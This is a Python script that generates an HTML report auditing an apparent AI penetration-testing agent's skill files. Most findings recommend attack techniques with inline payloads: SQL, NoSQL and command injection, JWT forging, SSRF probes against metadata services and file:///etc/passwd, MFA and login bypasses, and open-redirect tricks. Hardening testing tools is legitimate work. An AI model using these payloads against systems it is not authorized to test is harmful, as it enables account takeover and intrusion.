     "evidence":"nuclei matches root:.*?:[0-9]*:[0-9]*: (passwd), 'for 16-bit app support' (win.ini), (<web-app[\\s\\S]+</web-app>) (web.xml) across lfi/xxe/ssrf templates.",
     "rec":"Replace literal oracles with regex: passwd -> root:.*?:[0-9]+:[0-9]+: ; win.ini -> for 16-bit app support ; Java -> <web-app[\\s\\S]+</web-app> / WEB-INF/web.xml ; os-release -> ^NAME=. A single matching line is sufficient L3 proof — full dump not required."},
    {"title":"Time-based oracle needs a bounded window + a 0-delay control","file":"references/sqli.md, cmdi.md","pri":"high",
     "gap":"Both say 'if ~3s slower than baseline -> confirmed.' A single slow response on a noisy target is a classic FP; the skill never bounds the window or runs a 0-second control.",
     "evidence":"dast/vulnerabilities/sqli/time-based-sqli.yaml matcher is duration>=7 && duration<=16 (a window, not a floor) and gates on baseline duration<=7.",
     "rec":"Add to both: Use a distinctive delay (SLEEP(7)/sleep 7); confirm only if baseline < 4s AND 7s <= probe <= ~16s (value-proportional, bounded). Then send a SLEEP(0)/sleep 0 control and confirm it returns fast. Unbounded hang or delay that doesn't track the injected number is not proof. Add engine-correct forms: (SELECT*FROM(SELECT(SLEEP(7)))a) MySQL, ;WAITFOR DELAY '0:0:7'-- MSSQL, pg_sleep(7) PG."},
    {"title":"Missing class — NoSQL injection (Mongo $ne/$gt), incl. auth bypass","file":"index.md (new references/nosqli.md)","pri":"high",
     "gap":"No NoSQLi reference, despite it being one of the most common API-layer injection classes (JSON bodies + Mongo). Agent may misclassify as SQLi and burn budget on quotes that do nothing.",
     "evidence":"PayloadsAllTheThings 'NoSQL Injection/README.md' — operator table ($ne,$gt,$regex,$nin,$where) and auth-bypass bodies.",
     "rec":"Add references/nosqli.md. Auth bypass: baseline {\"username\":\"x\",\"password\":\"x\"} -> 401; probe {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} -> oracle = login succeeds (L4). Data-leak: replace a value with {\"$gt\":\"\"} -> response set grows vs exact-match baseline. Form-encoded: username[$ne]=x&password[$ne]=x. not_exploitable only after trying both JSON and bracket-form keys."},
    {"title":"cmdi has no WAF/filter-bypass spread for the negative-verdict rule","file":"references/cmdi.md","pri":"medium",
     "gap":"index.md mandates a spread of bypasses before not_exploitable, but cmdi.md only lists separators. Nothing for space/keyword filtering, so the agent wrongly concludes not_exploitable against a filter it never tried to bypass.",
     "evidence":"PayloadsAllTheThings 'Command Injection/README.md' Filter Bypasses ($IFS, brace expansion {cat,/etc/passwd}); nuclei cmdi/blind-oast-polyglots.yaml packs many separators+quotes into one request.",
     "rec":"Add a 'Bypass spread (try before negative)' block: no-space ;sleep${IFS}7, brace {sleep,7}, newline %0Asleep 7, backslash-newline, and a single polyglot probe sweeping separators+quotes in one request for budget efficiency. Note OOB (nslookup $marker) as the oracle when stdout isn't reflected."},
    {"title":"JWT section lacks the two highest-yield in-budget attacks","file":"references/auth-bypass.md, broken-auth.md","pri":"medium",
     "gap":"Both cover only alg:none + claim edits and then punt to exploitable_unverified for everything else. Weak-secret HMAC cracking and RS256->HS256 key confusion are both scriptable in one run_python call, so defaulting them to unverified under-reaches L4.",
     "evidence":"PayloadsAllTheThings 'JSON Web Token/README.md' — None-alg, Key-Confusion RS256->HS256 (CVE-2016-5431), weak-secret cracking (jwt_tool, c-jwt-cracker).",
     "rec":"Add an in-budget ladder: (1) alg:none — 1 request. (2) Weak-secret: in one run_python, HMAC-resign with a small wordlist (secret, password, app name, changeme, jwt); oracle = forged role:admin token accepted (L4). (3) RS256->HS256: fetch /.well-known/jwks.json, build the PEM, sign HS256 with it. Only fall to exploitable_unverified if the public key is unobtainable."},
    {"title":"XSS oracle should use randomized polyglot canary + AND content-type","file":"references/xss.md","pri":"medium",
     "gap":"Fixed canary CANARY_<b>test</b>_CANARY is predictable; nuclei uses a per-request random token. The skill also doesn't make content-type a hard AND gate, so the agent may call JSON reflections XSS.",
     "evidence":"dast/vulnerabilities/xss/reflected-xss.yaml: first=rand_int(10000,99999), payload '\"><{{first}}>, matchers-condition and: body contains raw '\"><NNNNN> AND content_type contains text/html.",
     "rec":"Quick confirm: inject '\"><RAND> (5-digit random); oracle = literal '\"><RAND> (brackets/quotes intact, not entity-encoded) appears in a text/html response — both required. Entity-encoded -> not_exploitable; raw but application/json -> exploitable_unverified."},
    {"title":"SSRF negative-verdict needs metadata response oracles + dict://, file://","file":"references/ssrf.md","pri":"medium",
     "gap":"Ref lists metadata URLs but no response oracle to distinguish a real metadata hit from a generic 200/error, and omits non-HTTP schemes (dict://, gopher://, file://) that bypass http-only allowlists.",
     "evidence":"dast/vulnerabilities/ssrf/response-ssrf.yaml body matchers: AWS ami-id[\\s\\S]+placement/, GCP dns-conf/[\\s\\S]+instance/, Redis (DENIED Redis|NOAUTH...), SSH SSH-(\\d.\\d)-OpenSSH_, MySQL (\\d.\\d.\\d).*?mysql_native_password; payloads dict://127.0.0.1:6379/info, file:////./etc/./passwd, Alibaba 100.100.100.200.",
     "rec":"Add a metadata/internal-service response-oracle table (the regexes above) so a confirmed hit is keyed on returned content, not status. Add to the bypass spread: dict://127.0.0.1:6379/info, file:///etc/passwd, gopher, Alibaba/Tencent metadata IPs. SSH/MySQL/Redis banner regexes turn blind SSRF into direct when any banner leaks."},
    {"title":"Mass-assignment lacks read-then-reflect discovery + deterministic confirm","file":"references/mass-assignment.md","pri":"medium",
     "gap":"It guesses field names; the strongest low-budget technique is 'GET the object, copy a privileged field name verbatim, PUT it back changed' — using the API's own vocabulary. Not mentioned.",
     "evidence":"PayloadsAllTheThings 'Mass Assignment/README.md' methodology.",
     "rec":"Add as step 1: GET the resource (or /users/me); any field the response exposes but the docs don't is a candidate — inject that exact key, don't guess. Make the oracle deterministic: send the privileged field with a distinctive value (\"credits\":133337) and confirm it echoes in the response or a follow-up GET — not merely 200 OK."},
    {"title":"IDOR verdict needs a victim-specific canary oracle","file":"references/idor.md","pri":"medium",
     "gap":"exploitable_unverified is defined as '200 but response doesn't clearly contain victim's data.' The skill doesn't tell the agent how to remove that ambiguity: seed the victim's record with a unique value during setup.",
     "evidence":"wstg access-control testing (WSTG-ATHZ-04 IDOR) — verification relies on confirming returned content belongs to the other user, not just status.",
     "rec":"Add to IDOR setup: give the victim a unique marker (email victim+CANARY9134@t.com, note CANARY9134). The oracle for exploitable: attacker token returns a body containing CANARY9134. A 200 without the canary stays exploitable_unverified. Control: confirm the victim's own token returns the canary first."},
    {"title":"OOB/interactsh confirmation underspecified for blind classes","file":"index.md, cmdi.md, ssrf.md, xxe.md","pri":"low",
     "gap":"No guidance that a unique-subdomain DNS/HTTP interaction is itself L3 proof for blind cmdi/SSRF/XXE, nor that the canary must be per-probe-unique. Agents tend to mark blind cases exploitable_unverified when an OOB hit would be L3.",
     "evidence":"nuclei blind templates key on interactsh_protocol containing dns/http with a per-payload unique marker (cmdi/blind-oast-polyglots, ssrf/blind-ssrf, ssti/oob/jinja2-oob, xxe/generic-xxe).",
     "rec":"In index.md add: a DNS or HTTP hit on a per-probe-unique subdomain you generated is L3 proof -> promote to exploitable, not exploitable_unverified. Make every OOB marker unique. If no listener exists, name 'OOB listener unavailable' as the external obstacle for exploitable_unverified."},
    {"title":"Open Redirect is a missing class with a clean one-request oracle","file":"index.md (new references/open-redirect.md)","pri":"low",
     "gap":"No open-redirect coverage. High-frequency in auth/OAuth flows, with the cleanest possible HTTP oracle (no browser) — ideal for an HTTP-only agent.",
     "evidence":"PayloadsAllTheThings 'Open Redirect/README.md' — oracle is a 30x with attacker host in Location; standard allowlist bypasses.",
     "rec":"Add references/open-redirect.md. Confirm (no redirect-follow): ?next=https://canary.example/ ; oracle = 30x AND Location starts with https://canary.example. Bypass spread: //canary.example, /\\canary.example, https:/canary.example, https://trusted@canary.example, https://trusted.canary.example, URL-encoded slashes."},
  ]},
"auth": {
  "blurb": "Black-box auth discovery: signup/login URL patterns, token extraction, two-user IDOR setup, auth/ memory convention. Compared against PayloadsAllTheThings (JWT/OAuth/Account-Takeover) and WSTG authentication chapters.",
  "findings": [
    {"title":"No JWT manipulation guidance despite JWT being the primary extracted credential","file":"auth/index.md","pri":"high",
     "gap":"The skill extracts and sets bearer JWTs but never tells the agent to attack them. None of the canonical bypasses are mentioned: alg:none, RS256->HS256 confusion, weak-secret cracking, kid traversal/SQLi, jku/jwk injection, null-signature (CVE-2020-28042).",
     "evidence":"PayloadsAllTheThings 'JSON Web Token/README.md'; wstg 06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md.",
     "rec":"Add '## After you obtain a JWT — try to forge it': decode header+payload. HS* -> crack the secret offline (pyjwt/jwt_tool, common-secrets list) then re-sign elevated claims (admin:true, swapped sub). RS* -> (a) alg:none with signature stripped, (b) RS256->HS256 signing with the public key (from /jwks.json) as the HMAC secret, (c) kid path traversal (kid:\"../../dev/null\" signed empty) and SQLi in kid, (d) jku/jwk to an attacker key. Use code-exec (pyjwt preinstalled) to forge, replay via http_request."},
    {"title":"OAuth/OIDC flows entirely absent","file":"auth/index.md","pri":"high",
     "gap":"Discovery only covers classic JSON signup/login. No redirect_uri tampering, state (CSRF) checks, auth-code reuse, scope manipulation, or token-via-referrer leakage, and no hint to look for /.well-known/openid-configuration or /authorize.",
     "evidence":"PayloadsAllTheThings 'OAuth Misconfiguration/README.md'.",
     "rec":"Add '## OAuth / OIDC targets': if login redirects to /authorize or /oauth/* or you see /.well-known/openid-configuration, test (1) redirect_uri to an attacker/open-redirect host to capture code/token; (2) missing/non-validated state -> callback CSRF/forced account linking; (3) reusing an authorization code twice; (4) downgrading scope to bypass redirect_uri filters; (5) token leaking in Referer. Persist client_id/redirect_uri under auth/oauth."},
    {"title":"No MFA/2FA-bypass coverage","file":"auth/index.md","pri":"medium",
     "gap":"Multi-step and MFA-protected logins stall the agent — the skill assumes one login returns a usable token. No guidance on the well-known 2FA bypass classes.",
     "evidence":"PayloadsAllTheThings 'Account Takeover/mfa-bypass.md'; wstg 04-Authentication_Testing/11-Testing_Multi-Factor_Authentication.md.",
     "rec":"Add '## When login is multi-step / MFA-gated': force-browse to the post-auth endpoint; submit code:null, 000000, or code:[123456] (array); replay an old/used OTP; check the OTP-submit response/JS for a leaked code; flip verified:false->true or status 401->200 on the verify response; check brute-force throttling."},
    {"title":"Login-bypass-by-injection not mentioned as a fallback","file":"auth/index.md","pri":"medium",
     "gap":"If signup/login patterns fail or creds are unknown, the skill has no fallback. WSTG's primary bypass techniques (SQLi auth bypass, parameter modification, loose comparison) are missing.",
     "evidence":"wstg 04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md.",
     "rec":"Add '## If you can't get valid creds, try to bypass': SQLi auth bypass (admin' --, ' OR 1=1-- ); parameter modification of returned auth flags (authenticated=1, role=admin); type-juggling ({\"password\":true}, NoSQL {\"password\":{\"$ne\":null}}, password[]=); guessable/sequential session IDs. Hand iterative SQLi extraction to code-exec."},
    {"title":"Token-handling is bearer-only; ignores cookies, CSRF, refresh, API keys","file":"auth/index.md","pri":"medium",
     "gap":"Extraction only looks for a bearer token in JSON and only sets kind:bearer. Many targets use Set-Cookie sessions (requiring a CSRF token), X-API-Key headers, or a separate refresh token. The skill never tells the agent to use a cookie session or extract the CSRF token.",
     "evidence":"wstg 06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md and 02-Testing_for_Cookies_Attributes.md.",
     "rec":"Turn 'Extract the token' into a decision tree: cookie-only login -> keep the cookie jar and harvest the CSRF token from the login/HTML response or /csrf, echo it in X-CSRF-Token; separate refresh_token -> save under auth/refresh; API key -> http_session_set(headers={'X-API-Key':...}). Common cookie names: session, sid, connect.sid, JSESSIONID, laravel_session."},
    {"title":"GraphQL auth endpoints not handled","file":"auth/index.md","pri":"low",
     "gap":"Discovery only probes REST signup/login. GraphQL targets put auth in a mutation login/register at /graphql; introspection + aliased-batching brute force unmentioned.",
     "evidence":"PayloadsAllTheThings 'GraphQL Injection/README.md'.",
     "rec":"Add a GraphQL note: if /graphql (or /api/graphql) exists, auth is usually mutation { login(email,password){ token } }. Run introspection (or Caido 'GraphQL Introspection Query' workflow) to find the auth mutation. Aliased batching (login1:..., login2:...) can defeat per-request rate limits."},
    {"title":"Two-user IDOR setup omits parallel-session / id-source mechanics","file":"auth/index.md","pri":"low",
     "gap":"The IDOR section says 'stay logged in as user 1' but the http session is a single jar — switching tokens needs explicit handling, and you usually need user 2's token to learn user 2's own IDs first.",
     "evidence":"PayloadsAllTheThings 'Account Takeover/README.md'; internal review of single-session http_session_set.",
     "rec":"Clarify: (1) register/login user 2, set its token, record its object IDs into auth/user2. (2) Switch back to user 1's token (don't keep both live). (3) Replay endpoints with user 2's IDs under user 1's token. Also try ID-less IDOR: drop the id and see if the server falls back to the JWT sub, then swap sub."},
  ]},
"caido": {
  "blurb": "Caido web-proxy workflows usage from the agent (caido_replay / caido_automate / caido_workflow_*). No public repo exists (caido/community is private) — audited on internal quality and Caido architecture knowledge.",
  "findings": [
    {"title":"No decision criterion for Caido vs the plain http_request tool","file":"caido/index.md","pri":"high",
     "gap":"The skill explains the three workflow tools but never says when to route traffic through Caido vs http_request. If the agent probes via http_request, none of that traffic reaches Caido, so passive findings stay empty — and the skill never states this dependency.",
     "evidence":"internal review",
     "rec":"Add '## Caido vs http_request': use http_request for one-off confirming probes and traffic you'll cite directly; route through Caido (caido_replay/caido_automate_run) when you want passive workflows to score it, need a convert recipe (PoC, GraphQL introspection), or an active check (CORS). NOTE: passive findings only fire on traffic Caido proxied — http_request traffic is invisible to Caido."},
    {"title":"Headless / GraphQL-callable nature of workflows never stated","file":"caido/index.md","pri":"medium",
     "gap":"Omits the most important architectural fact: Caido workflows are invokable headlessly via Caido's GraphQL API, whereas plugin RPC commands are not. An agent that doesn't know this wastes time trying to invoke plugin commands.",
     "evidence":"internal review (Caido architecture)",
     "rec":"Add to the intro: Workflows are the only Caido automation callable headlessly (over Caido's GraphQL API — what these tools use). Plugin RPC/UI commands are NOT headlessly callable; if a capability only exists as a plugin command, note it and do the step manually or via code-exec."},
    {"title":"No fallback path when a needed workflow isn't installed","file":"caido/index.md","pri":"medium",
     "gap":"The skill says 'fall back to doing the step manually' but gives no manual equivalents for its own curated list, so the fallback is hollow.",
     "evidence":"internal review",
     "rec":"For each curated convert workflow give the one-line manual fallback: Copy As Python Requests -> build the requests script yourself in code-exec; GraphQL Introspection -> send the standard __schema query via http_request; CORS Checker -> replay with Origin: https://evil.com and inspect Access-Control-Allow-Origin/-Credentials."},
    {"title":"Passive-workflow enablement mentioned but not actionable","file":"caido/index.md","pri":"low",
     "gap":"The skill warns passive workflows must be enabled but doesn't connect that caido_workflow_list returns an enabled field the agent should check before relying on passive findings.",
     "evidence":"internal review (skill states caido_workflow_list returns enabled)",
     "rec":"Add: before trusting caido_workflow_findings, call caido_workflow_list and confirm the passive workflows you care about show enabled:true. If disabled you can't enable them headlessly — note it and don't treat an empty findings list as 'no issues'."},
  ]},
"code-exec": {
  "blurb": "Python/bash sandbox for iterative probing (run_python/run_bash), binary-search extraction loops. No upstream repo — audited on internal quality for HTTP-probing patterns, OOB, output discipline, and safety.",
  "findings": [
    {"title":"No reusable requests.Session pattern for auth/cookie/CSRF carry-over","file":"code-exec/index.md","pri":"high",
     "gap":"Every idiom uses bare requests.post(...), which drops cookies and re-sends auth per call. For authenticated probing (the common case after auth runs) the script should use a Session with default headers, a retry adapter, and a timeout — none shown.",
     "evidence":"internal review",
     "rec":"Add '## Authenticated probing — use a Session':\nimport requests; from requests.adapters import HTTPAdapter, Retry\ns = requests.Session()\ns.headers[\"Authorization\"] = \"Bearer \" + TOKEN   # from auth/creds\ns.mount(\"http://\", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.3, status_forcelist=[429,500,502,503])))\ndef get(p, **kw): return s.get(URL+p, timeout=10, **kw)\nNote the session preserves cookies (needed for cookie/CSRF auth) across all requests."},
    {"title":"Binary-search idiom omits the time-based oracle variant","file":"code-exec/index.md","pri":"medium",
     "gap":"The example only handles a content/length/status oracle. Time-based blind SQLi/cmdi (the most common blind oracle when there's zero differential response) is described nowhere.",
     "evidence":"internal review",
     "rec":"Add a time-based oracle note: when TRUE/FALSE are byte-identical, inject SLEEP(3)/pg_sleep(3)/WAITFOR DELAY '0:0:3' gated on the condition; oracle = r.elapsed.total_seconds() > 2. Calibrate baseline latency first, pick a delay above jitter, median 2-3 samples per probe."},
    {"title":"No OOB / out-of-band listener pattern for blind SSRF/RCE/XXE","file":"code-exec/index.md","pri":"medium",
     "gap":"Covers in-band blind extraction but nothing about out-of-band detection — the only signal for blind SSRF, blind RCE, blind XXE. The sandbox has host network and writable disk, so it can run a one-line catcher and poll it.",
     "evidence":"internal review",
     "rec":"Add '## Out-of-band (OOB) detection': spin up python -m http.server 8000 (or a socket listener) in the background via execute_bash, embed the sandbox's reachable address as the callback in the payload, send the probe, then read the server log / hit count. Caveat: target must reach the sandbox host; fall back to a public interactsh-style collector if egress is one-way."},
    {"title":"Output discipline lacks a response-size cap / truncation rule","file":"code-exec/index.md","pri":"medium",
     "gap":"Says to print progress with flush=True but never warns against dumping large bodies / full enumeration lists / raw HTML into stdout, which blows the context budget when output is fed back to the model.",
     "evidence":"internal review",
     "rec":"Add to Discipline: keep stdout small — it is fed back into context. Print only the recovered value, decisive deltas, and a final RESULT: line; never dump full bodies or large lists. Write bulk output (enumerated IDs, full responses) to a file in the working dir (saved as an artifact) and print just the path and a count."},
    {"title":"No guidance on rate-limit / WAF politeness for loops","file":"code-exec/index.md","pri":"low",
     "gap":"Tight extraction/brute-force loops trip rate limits or WAFs, silently corrupting an oracle (429s look like FALSE). The skill never tells the agent to detect and back off on 429/403.",
     "evidence":"internal review (complements the existing 'oracle never converges' warning)",
     "rec":"Add to the Oracle section: treat 429/403 as a poisoned signal, not FALSE — if the oracle starts seeing them, back off (sleep, lower concurrency) and resume, or the binary search will lock onto wrong bytes. Add a small inter-request delay on live targets; abort the loop if the error rate spikes."},
  ]},
"likec4": {
  "blurb": "Authoring LikeC4 architecture-as-code (.c4 DSL): model, relationships, views, predicates, styling, deployment, CLI. Compared against upstream likec4 v1.57.0 source, grammar, and docs. The skill is a near-exact fork of upstream's likec4-dsl skill and predates two v1.57.0 features.",
  "findings": [
    {"title":"Missing `multiple` flag for splitting merged relationship edges","file":"references/views.md (+ predicates.md)","pri":"high",
     "gap":"New v1.57.0 feature (PR #2939). Several relationships between two elements merge into one [...] edge; `multiple true` renders each as its own edge. Settable spec-wide on a relationship kind or per-view via with { multiple true }. Never mentioned.",
     "evidence":"docs dsl/Views/predicates.mdx:312-327, dsl/styling.mdx:462-500; grammar like-c4.langium:843; CHANGELOG.md:6.",
     "rec":"Add a subsection 'Splitting merged relationship edges (multiple)':\nspecification { relationship async { multiple true } }   // spec-wide for a kind\ninclude customer -> cloud with { multiple true }          // per-view; multiple false disables\nNotes: only matching relationships split; expanded edges never participate in bidirectional merging."},
    {"title":"Missing `includeAncestors` deployment-view property","file":"references/deployment.md (+ index.md)","pri":"high",
     "gap":"New v1.57.0 feature (PR #2935). includeAncestors: true forces all ancestors of visible nodes into a deployment diagram (representation-only). Not mentioned anywhere.",
     "evidence":"docs dsl/Deployment/views.mdx:130-193; grammar like-c4.langium:778; CHANGELOG.md:8.",
     "rec":"Add to deployment.md:\ndeployment view ancestors_test {\n  includeAncestors: true\n  include hyp1.tomcat1.svc1\n  include hyp2.tomcat2.svc2\n}\nForces all ancestors of visible nodes to appear; does not affect visible relationships."},
    {"title":"Shape token set never enumerated despite index.md promising it","file":"references/style-tokens-colors.md","pri":"high",
     "gap":"index.md:259 says style-tokens-colors covers 'all shape values,' but the file lists none — mobile, bucket, document never appear, so the worker can't know they exist.",
     "evidence":"grammar like-c4.langium:970-980 ElementShape; dsl/styling.mdx:87.",
     "rec":"Add: Available shapes: rectangle (default), component, person, browser, mobile, cylinder, storage, queue, bucket, document."},
    {"title":"Border / line / arrow-head / size token sets never enumerated","file":"references/style-tokens-colors.md","pri":"high",
     "gap":"index.md:259 promises 'border/opacity/size tokens' and :257 references line/head/tail arrow shapes, but the file enumerates none. The worker only sees ad-hoc examples, risking invented values.",
     "evidence":"grammar — LineOptions = solid|dashed|dotted; BorderStyleValue = solid|dashed|dotted|none; ArrowType = none|normal|onormal|dot|odot|diamond|odiamond|crow|open|vee; SizeValue = xs|sm|md|lg|xl.",
     "rec":"Add a token table:\nline / border: solid, dashed, dotted (border also: none)\nhead / tail (ArrowType): none, normal, onormal, dot, odot, diamond, odiamond, crow, open, vee\nsize / padding / textSize / iconSize: xs, sm, md, lg, xl\nopacity: integer percentage, e.g. opacity 40%"},
    {"title":"Tags can carry a color in specification — not documented","file":"references/specification.md","pri":"medium",
     "gap":"The skill shows only bare `tag IDENTIFIER`. Upstream SpecificationTag accepts an optional { color <hex|rgb> } block (tag-coloured legends/elements).",
     "evidence":"grammar SpecificationTag: 'tag' tag=Tag ('{' ('color' color=ColorLiteral)? '}')?; dsl/specification.mdx:84-87.",
     "rec":"Add: Tags may define a color: tag deprecated { color #FF0000 } (hex or rgb(...)). Bare tag critical is still valid."},
    {"title":"Icon-discovery guidance gives no vetted known-good names","file":"references/style-tokens-colors.md (+ index.md)","pri":"medium",
     "gap":"The CLI is unavailable to the worker, and there's no icon-listing capability, yet the skill provides only 2-3 example icon names per group — risking invalid-icon failures. Upstream icons load on demand from a CDN and resolve by name.",
     "evidence":"dsl/styling.mdx icon section; CHANGELOG 1.56.0 'On-demand Icon Loading from CDN'; upstream cli list-icons --group.",
     "rec":"Add a vetted ~10-name shortlist per group: tech:react, tech:nodejs, tech:postgresql, tech:redis, tech:docker, tech:kubernetes, tech:nginx, tech:python, tech:typescript, tech:kafka; aws:lambda, aws:s3, aws:dynamodb, aws:api-gateway, aws:ec2, aws:rds, aws:sqs, aws:sns, aws:cloudfront."},
    {"title":"index.md Style property list conflates element vs relationship `multiple`","file":"index.md (Style section)","pri":"medium",
     "gap":"It lists `multiple` only among element style properties. With v1.57.0, multiple on a relationship (spec or with {}) controls edge-splitting — a distinct semantic. The single mention conflates the two.",
     "evidence":"dsl/styling.mdx:462-500 (relationship multiple) vs :177-192 (element multiple = stacked instances).",
     "rec":"Split the note: element multiple true = render element as multiple/stacked instances; relationship multiple true = split merged edges (cross-link to the views.md addition)."},
    {"title":"SizeValue legacy vs canonical aliases not flagged","file":"references/style-tokens-colors.md","pri":"low",
     "gap":"Grammar accepts both new short tokens (xs/sm/md/lg/xl) and legacy long ones (xsmall/.../xlarge). The skill uses neither consistently and never states the canonical form, so a worker may guess (tiny, huge).",
     "evidence":"grammar like-c4.langium:873-884 (SizeValue).",
     "rec":"State: Prefer xs, sm, md, lg, xl; the long forms xsmall/small/medium/large/xlarge are accepted aliases. xsmall/xs shows title only."},
  ]},
}

PRI_ORDER = {"high":0,"medium":1,"low":2}

def esc(s): return html.escape(str(s))

def count_pri():
    c = {"high":0,"medium":0,"low":0}
    for sk in SKILLS.values():
        for f in sk["findings"]:
            c[f["pri"]] += 1
    return c

total = sum(len(sk["findings"]) for sk in SKILLS.values())
pri = count_pri()

SKILL_TITLES = {
    "trace":"trace","vuln_scan":"vuln_scan","vulns":"vulns","exploit":"exploit",
    "auth":"auth","caido":"caido","code-exec":"code-exec","likec4":"likec4"}

parts = []
parts.append(f"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Contractor Skills — Improvement Report</title>
<style>
:root{{
  --bg:#0e1116; --panel:#161b22; --panel2:#1c2330; --border:#2a313c; --txt:#d7dde5;
  --muted:#8b95a3; --accent:#5b9dff; --accent2:#7c5cff;
  --high:#ff6b6b; --med:#ffb454; --low:#5ec9a8; --code:#0a0d12;
}}
*{{box-sizing:border-box}}
body{{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  background:var(--bg);color:var(--txt);line-height:1.55;font-size:15px}}
a{{color:var(--accent);text-decoration:none}}
.wrap{{max-width:1080px;margin:0 auto;padding:32px 22px 80px}}
header.hero{{border:1px solid var(--border);border-radius:16px;padding:30px 32px;
  background:linear-gradient(135deg,#161b22,#1a2030 60%,#1f1830);margin-bottom:26px}}
.hero h1{{margin:0 0 6px;font-size:27px;letter-spacing:-.3px}}
.hero .sub{{color:var(--muted);font-size:14.5px;max-width:760px}}
.hero .meta{{margin-top:14px;font-size:12.5px;color:var(--muted)}}
.stats{{display:flex;flex-wrap:wrap;gap:12px;margin:22px 0 6px}}
.stat{{flex:1 1 130px;background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px 16px}}
.stat .n{{font-size:25px;font-weight:700}}
.stat .l{{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}}
.stat.high .n{{color:var(--high)}} .stat.med .n{{color:var(--med)}} .stat.low .n{{color:var(--low)}}
h2.section{{font-size:19px;margin:34px 0 8px;padding-bottom:8px;border-bottom:1px solid var(--border)}}
.lead{{color:var(--muted);font-size:13.5px;margin:18px 0 4px}}
table.repos{{width:100%;border-collapse:collapse;margin:10px 0 6px;font-size:13px}}
table.repos th,table.repos td{{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top}}
table.repos th{{color:var(--muted);font-weight:600;font-size:11.5px;text-transform:uppercase;letter-spacing:.05em}}
table.repos td.sz{{color:var(--muted);white-space:nowrap}}
code,.mono{{font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace}}
.toolbar{{position:sticky;top:0;z-index:5;background:rgba(14,17,22,.92);backdrop-filter:blur(6px);
  border:1px solid var(--border);border-radius:12px;padding:10px 12px;margin:18px 0 20px;display:flex;
  flex-wrap:wrap;gap:8px;align-items:center}}
.toolbar .grp{{display:flex;gap:6px;flex-wrap:wrap}}
.toolbar .lbl{{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-right:2px}}
.btn{{cursor:pointer;border:1px solid var(--border);background:var(--panel);color:var(--txt);
  border-radius:999px;padding:4px 12px;font-size:12.5px;transition:.12s}}
.btn:hover{{border-color:var(--accent)}}
.btn.active{{background:var(--accent);border-color:var(--accent);color:#08111f;font-weight:600}}
.btn.p-high.active{{background:var(--high);border-color:var(--high)}}
.btn.p-medium.active{{background:var(--med);border-color:var(--med);color:#1a1206}}
.btn.p-low.active{{background:var(--low);border-color:var(--low);color:#06140f}}
.skill-block{{margin:30px 0}}
.skill-head{{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}}
.skill-head h3{{font-size:18px;margin:0;color:#fff}}
.skill-head .path{{font-size:12px;color:var(--muted)}}
.skill-blurb{{color:var(--muted);font-size:13px;margin:6px 0 14px;max-width:880px}}
.card{{border:1px solid var(--border);border-left-width:4px;border-radius:11px;background:var(--panel);
  padding:15px 17px;margin:11px 0}}
.card.high{{border-left-color:var(--high)}} .card.medium{{border-left-color:var(--med)}} .card.low{{border-left-color:var(--low)}}
.card .top{{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}}
.card .ttl{{font-weight:650;font-size:15px}}
.badge{{font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;
  padding:3px 9px;border-radius:999px;white-space:nowrap}}
.badge.high{{background:rgba(255,107,107,.16);color:var(--high)}}
.badge.medium{{background:rgba(255,180,84,.16);color:var(--med)}}
.badge.low{{background:rgba(94,201,168,.16);color:var(--low)}}
.card .file{{font-size:12px;color:var(--accent);margin:3px 0 10px}}
.fld{{margin:9px 0}}
.fld .k{{font-size:10.5px;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);margin-bottom:3px}}
.fld .v{{font-size:13.5px}}
.fld.evi .v{{font-size:12.5px;color:#a9b4c2}}
pre.rec{{background:var(--code);border:1px solid var(--border);border-radius:8px;padding:11px 13px;margin:3px 0 0;
  font-size:12.3px;white-space:pre-wrap;word-break:break-word;color:#cdd6e0;overflow-x:auto}}
.empty{{display:none;color:var(--muted);font-style:italic;padding:20px}}
footer{{margin-top:50px;border-top:1px solid var(--border);padding-top:18px;color:var(--muted);font-size:12.5px}}
.toc{{display:flex;flex-wrap:wrap;gap:8px;margin:6px 0 0}}
.toc a{{font-size:12.5px;background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:4px 10px}}
</style></head><body><div class="wrap">

<header class="hero">
  <h1>Contractor Skills — GitHub-Sourced Improvement Report</h1>
  <div class="sub">Each of the 8 agent skills under <code>contractor/skills/</code> was audited against authoritative
  open-source security knowledge bases and the upstream LikeC4 project. Findings below are concrete, near-copy-ready
  additions backed by a specific upstream rule, payload, template, or grammar reference.</div>
  <div class="meta">Generated {esc(DATE)} &nbsp;•&nbsp; {total} findings across 8 skills &nbsp;•&nbsp; 7 reference repos compared
  &nbsp;•&nbsp; clones under <code>docs/research/repos/</code> (git-ignored)</div>
</header>

<div class="stats">
  <div class="stat"><div class="n">{total}</div><div class="l">Total findings</div></div>
  <div class="stat high"><div class="n">{pri['high']}</div><div class="l">High priority</div></div>
  <div class="stat med"><div class="n">{pri['medium']}</div><div class="l">Medium priority</div></div>
  <div class="stat low"><div class="n">{pri['low']}</div><div class="l">Low priority</div></div>
  <div class="stat"><div class="n">8</div><div class="l">Skills audited</div></div>
</div>

<h2 class="section">Methodology</h2>
<p class="lead">Curated GitHub repositories were shallow-cloned locally, then per-skill analysis agents compared each
skill's content against the relevant corpus — looking for missing sink/source patterns, payloads, oracles, engines,
secrets regexes, and DSL features. Recommendations deliberately teach <em>general methodology</em>, not any
benchmark-specific bug, to avoid eval overfitting.</p>
<table class="repos"><thead><tr><th>Repository</th><th>Size</th><th>What it provides</th><th>Maps to</th></tr></thead><tbody>""")

for name,sz,desc,maps in REPOS:
